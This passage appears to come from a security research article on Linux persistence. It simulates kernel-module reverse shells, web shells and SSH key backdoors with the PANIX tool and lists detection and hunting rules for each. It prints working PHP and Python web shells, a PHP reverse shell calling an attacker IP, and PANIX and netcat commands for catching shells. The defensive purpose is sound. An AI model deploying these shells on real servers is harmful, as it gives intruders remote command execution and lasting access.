<p>PANIX is executed, initiating the compilation process for the LKM using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">make</code>, ensuring it is built for the active kernel version. Once compiled, the resulting <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">panix.ko</code> module is placed in the appropriate module library directory for the current kernel. To achieve persistence across reboots, a configuration file named <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">panix.conf</code> is created in both <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/modules-load.d/</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/modules-load.d/</code>. The module is then loaded into the kernel using the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">insmod</code> command, activating the reverse shell. Leveraging the Auditd Manager integration, we can observe the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">kmod</code> utility loading the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">panix</code> kernel module.</p>
<p>This technique can leave behind several traces. The following detection- and endpoint rules are in place to effectively detect these:</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>Driver</td><td><a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_kernel_driver_load.toml">Kernel Driver Load</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_kernel_driver_load_by_non_root.toml">Kernel Driver Load by non-root User</a></td></tr><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_lkm_configuration_file_creation.toml">Loadable Kernel Module Configuration File Creation</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_kernel_object_file_creation.toml">Kernel Object File Creation</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_insmod_kernel_module_load.toml">Kernel Module Load via insmod</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/defense_evasion_kernel_module_removal.toml">Kernel Module Removal</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/discovery_kernel_module_enumeration.toml">Enumeration of Kernel Modules</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/defense_evasion_clear_kernel_ring_buffer.toml">Attempt to Clear Kernel Ring Buffer</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_load_and_unload_of_kernel_via_kexec.toml">Kernel Load or Unload via Kexec Detected</a></td></tr><tr><td>Syslog</td><td><a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_tainted_kernel_module_load.toml">Tainted Kernel Module Load</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_tainted_kernel_module_out_of_tree_load.toml">Tainted Out-Of-Tree Kernel Module Load</a></td></tr><tr><td><em>Detection and endpoint rules that cover loadable kernel module persistence</em></td><td></td></tr></tbody></table></div>
<p>For more information on how to set up the Auditd Manager integration to capture driver events and much more, check out the <a href="https://www.elastic.co/security-labs/linux-detection-engineering-with-auditd">Linux Detection Engineering with Auditd</a> publication.</p>
<p>We can revert this module by executing the following command:</p>
<pre><code>&gt; sudo ./panix.sh --revert lkm

###### [+] Reverting lkm module... #####

[+] Unloading kernel module &#x27;panix&#x27;...
[+] Kernel module &#x27;panix&#x27; unloaded successfully.
[+] Removing kernel module file &#x27;/lib/modules/4.19.0-27-amd64/kernel/drivers/panix.ko&#x27;...
[+] Kernel module file &#x27;/lib/modules/4.19.0-27-amd64/kernel/drivers/panix.ko&#x27; removed successfully.
[+] Removing temporary directory &#x27;/tmp/lkm&#x27;...
[+] Temporary directory &#x27;/tmp/lkm&#x27; removed successfully.
[+] Removing panix from /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/...
[+] Updating module dependencies...
[+] Module dependencies updated.</code></pre>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="hunting-for-t1547006---kernel-modules-and-extensions" class="absolute -top-32"></span>Hunting for T1547.006 - Kernel Modules and Extensions</h4>
<p>We can hunt for this technique using ES|QL and OSQuery, focusing on suspicious kernel module activity, including the creation of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.ko</code> files, execution of kernel module management tools, and modifications to kernel module configuration files. The hunting approach includes:</p>
<ul>
<li><strong>Monitoring kernel module file creation:</strong> Tracks <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.ko</code> file creations in non-standard directories to detect potentially malicious modules.</li>
<li><strong>Identifying unusual module management executions:</strong> Monitors processes such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">kmod</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">modprobe</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">insmod</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rmmod</code> for suspicious or uncommon arguments.</li>
<li><strong>Detecting changes to configuration files:</strong> Observes files like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/modprobe.d/</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/modules</code>, and related directories for modifications that might enable persistence.</li>
<li><strong>Focus on rare drivers:</strong> Use queries that identify kernel modules loaded via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init_module</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">finit_module</code> syscalls that occur infrequently.</li>
</ul>
<p>By combining the <a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_loadable_kernel_modules.md">Persistence via Loadable Kernel Modules</a> and <a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_driver_load_with_low_occurrence_frequency.md">Drivers Load with Low Occurrence Frequency</a> hunting rules, along with tailored detection queries, analysts can effectively identify <a href="https://attack.mitre.org/techniques/T1547/006/">T1547.006</a>-related activity.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1505003---server-software-component-web-shell" class="absolute -top-32"></span>T1505.003 - Server Software Component: Web Shell</h2>
<p>A web shell is a malicious script uploaded to a web server, enabling attackers to execute arbitrary commands on the host. They are commonly deployed after exploiting vulnerabilities in server software, weak file upload restrictions, or misconfigurations. Web shells are typically small scripts written in commonly supported languages such as PHP, Python, or Perl. This activity is tracked by MITRE under <a href="https://attack.mitre.org/techniques/T1505/003/">T1505.003</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1505003---web-shell---php--python" class="absolute -top-32"></span>T1505.003 - Web Shell - PHP &amp; Python</h3>
<p>Web shells often integrate seamlessly with web server configurations like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Apache</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Nginx</code>, or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Lighttpd</code>. These scripts can be categorized into two primary types: command execution (CMD) and reverse shell web shells.</p>
<p><strong>1. Command shells</strong></p>
<p>CMD web shells provide a simple interface to execute system commands through a browser or remote tool. A typical PHP CMD web shell might look like this:</p>
<pre><code>&lt;?php
if (isset($_GET[&#x27;cmd&#x27;])) {
    echo shell_exec($_GET[&#x27;cmd&#x27;]);
}
?&gt;</code></pre>
<p><strong>2. Reverse shells</strong></p>
<p>Reverse shell web shells establish an outbound connection from the compromised server to the attacker’s machine. An example PHP reverse shell:</p>
<pre><code>&lt;?php
$ip = &#x27;192.168.1.100&#x27;; // Attacker IP
$port = 4444;          // Attacker Port
$socket = fsockopen($ip, $port);
exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);
?&gt;</code></pre>
<p>The attacker runs a listener on their machine using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Netcat</code> or any other listener. When the shell script is accessed, it connects to the attacker, providing an interactive session.</p>
<p><strong>Leveraging the Common Gateway Interface (CGI) for web shells</strong></p>
<p>The <a href="https://www.ibm.com/docs/en/i/7.4?topic=functionality-cgi">Common Gateway Interface (CGI)</a> allows web servers to execute external scripts and return their output to clients. Attackers can use CGI scripts to execute commands in various languages, including Python, Bash, and Perl. A Python CGI web shell example:</p>
<pre><code>#!/usr/bin/env python3
import cgi
import os

print(&quot;Content-type: text/html\n\n&quot;)
form = cgi.FieldStorage()
command = form.getvalue(&quot;cmd&quot;)
if command:
    output = os.popen(command).read()
    print(output)</code></pre>
<p>CGI scripts offer versatility and can be used in environments where PHP or other web shells might be restricted.</p>
<p>Attackers often target web root directories like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/www/html/</code> to upload their web shells. Weak file upload restrictions or misconfigured permissions allow them to place malicious scripts. To enhance persistence, attackers may:</p>
<ul>
<li><strong>Embed Web Shells in Existing Files</strong>: Modify legitimate files to include web shell code, making detection more challenging.</li>
<li><strong>Use Built-in Web Servers</strong>: Attackers can start a web server in a specific directory to bypass restrictions</li>
<li><strong>Leverage Hidden Directories</strong>: To avoid detection, locate web shells in obscure or hidden directories.</li>
</ul>
<p>Although this type of implementation is also possible for languages other than PHP and Python, they commonly require modules/plugins to be installed, making them a less viable option. The following section will explore detailed examples of these methods and their corresponding detection strategies.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="persistence-through-t1505003---web-shell-php--python" class="absolute -top-32"></span>Persistence through T1505.003 - Web Shell: PHP &amp; Python</h4>
<p>Let’s examine how PANIX leverages PHP, Python, and CGI to establish web shell backdoors within the <a href="https://github.com/Aegrah/PANIX/blob/ae404d5caf74c772436ccaaa0c3ab51cba8c4250/modules/setup_web_shell.sh">setup_web_shell.sh</a> module. Refer to the module to inspect the full payloads.</p>
<p>Depending on permissions, PANIX creates a web server in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/www/html/</code> (root) or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">$HOME/</code> (non-root). PHP uses the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-S</code> flag to start a lightweight server, with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-t</code> specifying the root directory to serve the web shells. For Python, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-m http.server</code> module is combined with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--cgi</code> to enable dynamic execution of CGI scripts. If only Python 2 is available, PANIX falls back to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-m CGIHTTPServer</code> for compatibility.</p>
<p>Servers are launched in the background using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nohup</code> to ensure persistence, remaining active even after the user logs out.</p>
<p>Let’s look at what traces we can detect within these chains, starting with a PHP CMD shell. To simulate this activity, we can use the following PANIX command:</p>
<pre><code>&gt; ./panix.sh --web-shell --language php --mechanism cmd --port 8080

[+] Web server directory created at /home/ruben/panix/
[+] cmd.php file created in /home/ruben/panix/
[+] Interact via: curl http://&lt;ip&gt;:8080/cmd.php?cmd=whoami
[!] Starting PHP server on port 8080...
[+] PHP server running in the background at port 8080.
[!] In case you cannot connect, ensure your firewall settings are allowing inbound traffic on port 8080.

Run the following commands in case of issues on RHEL/CentOS systems:

sudo firewall-cmd --add-port=8080/tcp --permanent
sudo firewall-cmd --reload</code></pre>
<p>After execution, we can call the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cmd.php</code> through the following <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">curl</code> command:</p>
<pre><code>&gt; curl http://192.168.1.100:8080/cmd.php?cmd=whoami
ruben</code></pre>
<p>Executing the payload generates the following documents in Kibana:</p>
<p></p>
<p>The figure above shows PANIX being executed and the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/home/ruben/panix/</code> directory being created (as PANIX is executed with user privileges). The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cmd.php</code> file is created, and the PHP web shell is spawned with the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-S</code> flag and listens on all interfaces (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0.0.0.0</code>) on port 8080. Upon execution of the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">curl</code> command from the attack host, we can see a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">connection_accepted</code>, followed by the execution of the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">whoami</code> command, followed by a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">disconnect_received</code>.</p>
<p>To simulate reverse shell behavior, we can simulate a Python reverse shell through the following PANIX command:</p>
<pre><code>./panix.sh --web-shell --language python --mechanism reverse --port 8080 --rev-port 2018 --ip 192.168.1.100

[+] Web server directory created at /home/ruben/panix/
[+] reverse.py file created in /home/ruben/panix/cgi-bin/
[+] Interact via: curl http://&lt;ip&gt;:8080/cgi-bin/reverse.py
[!] Starting Python3 server on port 8080 with CGI enabled...
[+] Python3 server running in the background at port 8080.
[!] In case you cannot connect, ensure your firewall settings are allowing inbound traffic on port 8080.

Run the following commands in case of issues on RHEL/CentOS systems:

sudo firewall-cmd --add-port=8080/tcp --permanent
sudo firewall-cmd --reload</code></pre>
<p>After which, we can communicate with the reverse shell from the attacker machine through the following commands:</p>
<pre><code>// Terminal 1
&gt; curl http://192.168.1.100:8080/cgi-bin/reverse.py

// Terminal 2
&gt; nc -nvlp 2018
listening on [any] 2018 ...
connect to [192.168.211.131] from (UNKNOWN) [192.168.211.151] 47250
&gt; whoami
ruben</code></pre>
<p>This module generates the following documents:</p>
<p></p>
<p>After PANIX executes, we can see <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/home/ruben/panix/cgi-bin/reverse.py</code> being created and execution permissions being granted. A <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">python3</code> web server with CGI support is spawned. After executing the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">curl</code> command from the attacker machine, we can see an incoming connection through the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">connection_accepted</code> event, followed by the execution of the reverse shell command, leading to the call back to the attacker machine through the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">connection_attempted</code> event. A fully interactive shell is obtained once the attacker catches the reverse connection.</p>
<p>You can revert the changes made by PANIX by running the following revert command:</p>
<pre><code>&gt; ./panix.sh --revert web-shell

###### [+] Reverting web-shell module... #####

[+] Running as non-root. Reverting web shell for user &#x27;ruben&#x27;.
[+] Reverting web shell for user &#x27;ruben&#x27; at: /home/ruben/panix/
[+] Identifying web server processes serving /home/ruben/panix/...
[+] Killed process 11592 serving /home/ruben/panix/.
[+] Removed web server directory: /home/ruben/panix/</code></pre>
<p>After which, all artifacts should be cleaned.</p>
<p>Let’s take a look at the coverage:</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/linux/persistence_suspicious_file_creation_via_web_server.toml">Suspicious File Creation via Web Server</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_file_downloaded_from_suspicious_source_by_web_server.toml">File Downloaded from Suspicious Source by Web Server</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_file_downloaded_and_piped_to_interpreter_by_web_server.toml">File Downloaded and Piped to Interpreter by Web Server</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_suspicious_download_and_redirect_by_web_server.toml">Suspicious Download and Redirect by Web Server</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/execution_python_webserver_spawned.toml">Web Server Spawned via Python</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_simple_web_server_creation.toml">Simple HTTP Web Server Creation</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_linux_shell_activity_via_web_server.toml">Potential Remote Code Execution via Web Server</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/linux/persistence_file_downloaded_to_suspicious_location_by_web_server.toml">File Downloaded to Suspicious Location by Web Server</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/linux/persistence_decode_activity_via_web_server.toml">Decode Activity via Web Server</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/linux/persistence_unusual_command_executed_by_web_server.toml">Unusual Command Executed by Web Server</a></td></tr><tr><td>Network</td><td><a href="https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_reverse_shell_executed_via_web_server.toml">Reverse Shell Executed via Web Server</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_simple_web_server_connection_accepted.toml">Simple HTTP Web Server Connection</a></td></tr><tr><td><em>Detection and endpoint rules that cover web shell persistence</em></td><td></td></tr></tbody></table></div>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="hunting-for-t1505003---web-shell" class="absolute -top-32"></span>Hunting for T1505.003 - Web Shell</h4>
<p>We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious file creation events and anomalous network activity commonly associated with web shells. The approach includes monitoring for the following:</p>
<ul>
<li><strong>Creation or renaming of web shell files:</strong> Tracks files with extensions such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.php</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.py</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.pl</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.rb</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.lua</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.jsp</code> in unexpected or uncommon locations, which may indicate the deployment of a web shell.</li>
<li><strong>Anomalous network activity by scripting engines:</strong> Observes disconnect events and unusual connections initiated by processes like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">python</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">php</code>, or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">perl</code>, particularly connections to external IP addresses.</li>
<li><strong>Low-frequency external connections:</strong> Detects rare or low-volume network connections from processes, especially those initiated by root or unique agents, which can indicate malicious web shell activity.</li>
</ul>
<p>By combining the <a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_web_shell.md">Persistence via Web Shell</a>, <a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_reverse_bind_shells.md">Persistence Through Reverse/Bind Shells</a>, and <a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/low_volume_external_network_connections_from_process.md">Low Volume External Network Connections from Process by Unique Agent</a> hunting rules with the tailored detection queries listed above, analysts can effectively detect and respond to <a href="https://attack.mitre.org/techniques/T1505/003/">T1505.003</a>.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1098004---account-manipulation-ssh-authorized-keys" class="absolute -top-32"></span>T1098.004 - Account Manipulation: SSH Authorized Keys</h2>
<p>SSH&#x27;s <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">authorized_keys</code> feature is a common target for attackers aiming to establish persistent access to compromised Linux systems. By placing their public keys in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">authorized_keys</code> file, attackers can gain access without requiring further authentication if the private key is in their possession. This mechanism is controlled by files like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.ssh/authorized_keys</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.ssh/authorized_keys2</code>, typically in the user’s home directory. While this persistence method is well-documented, we explored its nuances in detail in <a href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms#t1098004---account-manipulation-ssh">a previous article</a>.</p>
<p>In this section, we will focus on a less conventional but intriguing variation of this technique: abusing system accounts that by default are rarely used and have default configurations. This approach leverages the default home directories of these users to create <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.ssh</code> directories and insert <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">authorized_keys</code> files, enabling SSH-based persistence under these accounts. <a href="https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/">Exatrack’s research</a> on a new variant of the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">perfctl</code> malware recently explored this technique. Although this specific variation of the authorized keys persistence technique is not tracked by MITRE, the overall persistence technique is tracked under <a href="https://attack.mitre.org/techniques/T1098/004/">T1098.004</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1098004---ssh-authorized-keys-system-user-backdoors" class="absolute -top-32"></span>T1098.004 - SSH Authorized Keys: System User Backdoors</h3>
<p>System accounts like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">news</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nobody</code> often exist on default Linux installations with non-interactive shells (e.g., <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/sbin/nologin</code>) and predefined home directories. These accounts, typically overlooked and not intended for direct login, can become attractive targets for attackers. We can observe their configurations in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/passwd</code> file:</p>
<pre><code>&gt; cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</code></pre>
<p>As we can see, the root user&#x27;s home directory is <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/root/</code>, while system users like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">news</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">backup</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nobody</code> also have default home directories, such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/spool/news/</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/nonexistent/</code>. The default shell for root is <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/bin/bash</code>, whereas system users are restricted by <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/sbin/nologin</code>.</p>
